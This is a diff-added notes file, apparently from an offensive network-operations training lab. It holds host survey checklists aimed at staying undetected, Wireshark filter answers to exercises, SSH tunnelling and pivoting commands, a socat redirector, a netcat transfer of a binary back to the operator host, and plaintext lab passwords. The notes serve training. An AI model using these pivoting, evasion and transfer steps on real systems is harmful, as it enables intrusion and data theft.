+#4. Windows Survey {
+- am i caught?
+- is it safe to operate
+
+ifconfig /all # is the correct host 
+
+wmic process get executablepath,processid,parentprocessid | more
+wmic process get commandline | more 
+
+netstat -ano | findstr EST 
+netstat -ano | findstr LIST 
+
+date /t 
+time /t 
+
+psloggedon # any users logged on /accessing user shares 
+auditpol # which events get logged? 
+
+pslist # CPU core and OS info 
+	// Idle thread num = num processor cores 
+	// System pid 4 = XP and above 
+	// wininit and LSM in proclist = Vista+
+	
+reg query hklm\system\currentcontrolset\control\windows # Service Pack = CSDVersion
+
+nbtstat -n # names registered locally on system by netbios (e.g. server, redirector)
+
+route print 
+netstat -rn 
+
+net use # any resources host is connected to 
+net shares # resources host is sharing out 
+
+net services # running services 
+
+dir /tc /od c:\windows\system32 
+
+autorunsc -b # boot startups
+autorunsc -l # logon startups 
+
+reg query hklm\software\microsoft\windows\currentversion\run 
+reg query hkcu\software\microsoft\windows\currentversion\run 
+reg query hklm\software\microsoft\windows\currentversion\runonce
+reg query hkcu\software\microsoft\windows\currentversion\runonce
+reg query "hklm\software\microsoft\windows nt\currentversion\winlogon" /v shell 
+
+net users 
+
+reg query hklm\system\currentcontrolset\control\hivelist
+
+}
+
+#5. UNIX Survey {
+w # uptime, systemload, tty users 
+date && date -u
+
+id # id,guid,selinux context if applicable 
+
+uname -a # kernel, processor, platform
+
+hostname 
+
+sestatus 
+
+ps -ef --sort start_time 
+	ps -elf 
+	ps aux www
+
+ifconfig -a 
+
+netstat -antup 
+	# dont use -p unless root. logs selinux
+	
+netstat -rn 
+
+arp -v 
+
+df -h 
+
+df -i 
+
+ls -latrd /etc/cron* 
+ls -latr /var/spool/cron /var/spool/at 
+
+ls -latr /root 
+ls -latr /home/
+ls -latr /home/*
+ls -latr /export/home
+ls -latr /export/home/*
+
+less /root/.history 
+
+ls -latr /tmp 
+ls -latr / 
+
+ls -latr /bin
+ls -latr /sbin
+ls -latr /usr/bin 
+ls -latr /usr/sbin
+ls -latr /usr/local/bin
+ls -latr /usr/local/sbin 
+
+# log checks 
+ls -latr /var/log /var/log/audit 
+ls -latr /var/adm # solaris 
+
+last -i 
+
+# grep logs for user pid, user name, IP
+egrep "kernel|dbus" /var/log/messages 
+
+egrep -v "kernel|dbus" /var/log/messages | tail -50
+
+}
+
+#6. Windows Process List - Triage {
+RISK
+- how likely is it my presence will be noticed? is it safe to operate?
+
+	# server related procs? or just user 
+tasklist 
+
+netstat -anob 
+
+wmic process get executablepath 
+
+reg query HKLM /s /f "path-to-sus-proc"
+
+# where is sus.exe supposed to exist?
+
+}
+
+#7. UNIX Process List {
+- looking for: malware, backdoors, gen. compromise 
+- examine: proclist, network sockets, user accs, logs : what is purpose 
+- sus: remote access, monitoring tools, tools not w/system primary purpose
+
+ps -ef 
+
+considerations:
+- do proces match typical OS config?
+- GUI/no gui?
+- server/workstation?
+- remote access ports e.g. portmap (rpc), cupds (printserver), inetd, mail server, sshd
+- logging tools? e.g. auditd, audispd, syslogd, klogd 
+
+Procs 
+- unusual location 
+- unusual start time 
+- invalid args 
+- unusual user ID 
+- strange parent/child procs 
+- unfamiliar procs 
+- missing pocs? # could be rootkit filtering info e.g. mingetty 2-6 but not mingetty/any procs on tty 1??
+				// is proc PID missing on proclist? could be running from hidden daemon
+}
+
+# Exer 1. - BPF Filtering {
+
+#1. What address was offered to the requesting system from the DHCP server?
+udp.port == 80
+
+#3. How many DNS standard queries were made within the supplied packet capture?
+dns and (dns.flags.response == 0)
+
+#4. Identify the IP address of mountain.felidae.lab
+- pull up DNS queries^ , find matching response packet
+	#or just # udp.port == 53 && ip.src == 10.57.123.11 
+
+#5. What is the hostname of the DNS server.
+- after any ip query response following NS [NS name] # or find in an SOA / zone transfer 
+
+#6. What is the packet count for only "A Record" responses?
+dns and (dns.qry.type == 1) and (dns.flags.response == 1)
+	# qry.type 1 = A record, flags.reponse 1 == response
+
+#7. How many DNS standard reverse lookup respsonses were made within the supplied packet capture?
+dns and (dns.qry.type == 12) and (dns.flags.response == 1) 
+	# qry type 12 == PTR record =  used for reverse lookups
+
+#8. Find DNS zone transfer 
+tcp.port==53 # zone transfers always over TCP
+
+#14. Using a Wireshark filter, create a filter that would filter on the FTP command "PWD"
+ftp.request.command == "PWD" 
+
+#15. user-agent strings 
+http.user_agent 
+
+#16. remove all ARP and ICMP traffic
+not arp and not icmp 
+
+#18. arp replies 
+arp.opcode == 2 # 1 == arp requests 
+
+
+#19. Identify the Wireshark filter that would display only ICMP Echo (Ping) Requests
+icmp.type == 8 and icmp.code == 0
+
+#20. mySQL traffic 
+tcp.port == 3306 
+-> follow tcp stream 
+	# follow stream // show tables == table.field
+
+#21. Which fields are contained in the corpFinanceData table from the MySQL server?
+mysql.field.catalog 
+
+#22. Select the table names in the database stored on the MySQL servel
+mysql.table_name
+
+#28. identify all IP addresses with an open TCP port 22 
+tcp.flags.syn == 1 && tcp.flags.ack == 1 and tcp.port == 22
+
+#30. Create a filter to identify RST/ACK packets, what is the packet count?
+tcp.flags.reset == 1 && tcp.flags.ack == 1
+
+}
+
+# Exer 2. - Network Troubleshooting - Network Analysis 1: {
+
+{ # Diagram 
+
+
+1337h4x			rodgers.matecumbe.lab  win7.drytortugas.lab 
+192.168.11.15		198.19.118.12		172.17.10.71
+--------------      --------------      --------------    
+|            |      |            |      |            |    
+|            ------->22          |      |            |    
+|        2223=====================------>23          | 
+|         445<===================<-------445         |   
+|            |      |            |      |            |    
+--------------      --------------      --------------   
+
+
+1337h4x			rodgers.matecumbe.lab 	win10.drytortugas.lab
+192.168.11.15		198.19.118.12		172.17.10.77
+--------------      --------------      --------------    
+|            |      |            |      |            |    
+|            ------->22          |      |            |    
+|       33389=====================------>3389        |    
+|            |      |            |      |            |    
+--------------      --------------      --------------    
+
+# FEEDBACK DIAGRAM
+
+1337h4x.ops.local     rodgers.matecumbe.lab     win7.drytortugas.lab     win10.drytortugas.lab
+ 192.168.11.15        198.19.118.12        172.17.10.71        172.17.10.77
+---------------     ---------------     ---------------
+|             ------>22           |     |             |
+|         2323>===================------>23           |
+|          445<------==========445<     |             |     ---------------
+|             |     |             |     ---------------     |             |
+|        55589>====================------------------------->3389         |
+|             |     |             |                         |             |
+---------------     ---------------                         ---------------
+
+
+ssh -p22 root@198.19.118.12 -L2223:172.17.10.71:23 -R445:192.168.11.11:445
+D1re$traits
+
+telnet 127.0.0.1 2223 
+
+# add static route 
+route add -net 172.17.10.0 netmask 255.255.255.0 gw 198.19.118.254
+	#feedback 
+	ip route add 172.17.10.0/24 via 198.19.118.254 dev ens192
+
+administrator
+J0urney
+
+#5. map temp share 
+net use x: \\198.19.118.12\Temp /user:administrator
+
+copy c:\temp\interesting-binary.exe x:\
+
+#6. next tunnel 
+-L0.0.0.0:3389:172.17.10.77:3389
+
+mstsc /v:198.19.118.15
+
+}
+
+}
+
+# Exer 3 - Network Troubleshooting - Network Analysis 2: {
+
+{ # Diagram 
+1337h4x.ops.local     sec-nix.matecumbe.lab     pub.noname.lab      bridge.noname.lab 
+ 192.168.11.15        10.43.35.97/24        172.16.147.55/24        172.16.147.222/24
+---------------     ---------------     ---------------
+|             ------>22           |     |             |
+|         2221>===================------>55522        |
+|          22<------==========2222<     |             |     ---------------
+|             |     |             |     ---------------     |             |
+|         2222>====================------------------------->22           |
+|		  1337<------==========1337<                        |             |
+|             |     |             |                         |             |
+---------------     ---------------                         ---------------
+
+} 
+
+#2. 
+ssh root@10.43.35.97 -L2221:172.16.147.55:55522 -R2222:192.168.11.15:22
+F0r3igner
+
+#2.5 add route on J1  
+ip route add 172.16.147.0/24 via 10.43.35.254 dev eth0 
+
+#4.
+ssh -p2221 root@127.0.0.01 
+M3n@tWork
+
+#5. 
+scp -P2222 /temp/Interesting-Binary root@10.43.35.97:/tmp
+
+#6. ~ + C 
+-L2222:172.16.147.222:22
+
+#7.
+socat TCP-LISTEN:1337 TCP-CONNECT:192.168.11.15:1337
+
+#8. 
+ssh -p2222 root@127.0.0.1 
+D@ughtry
+
+cat /tmp/Interesting-Binary | base64 > /tmp/bin.64
+
+#9. transfer 
+nc -lvp 1337 < /tmp/bin.64 # on ops 
+
+nc 10.43.35.97 1337 > /tmp/bin.64
+	# NOTE: netcat transfer may not terminate on its own
+python -m base64 -d /tmp/bin.64 > /tmp/Interesting-Binary
+}
+
+
+
+}
+
+}
+
+----- triple check IPs. If not hanging, probably a routing issue (aka typo)
+----- when looking for beacons, dont confuse incoming src ports with destination/ connect ports! 
+----- tcpdump -i 
+----- certain commands may have more options..........
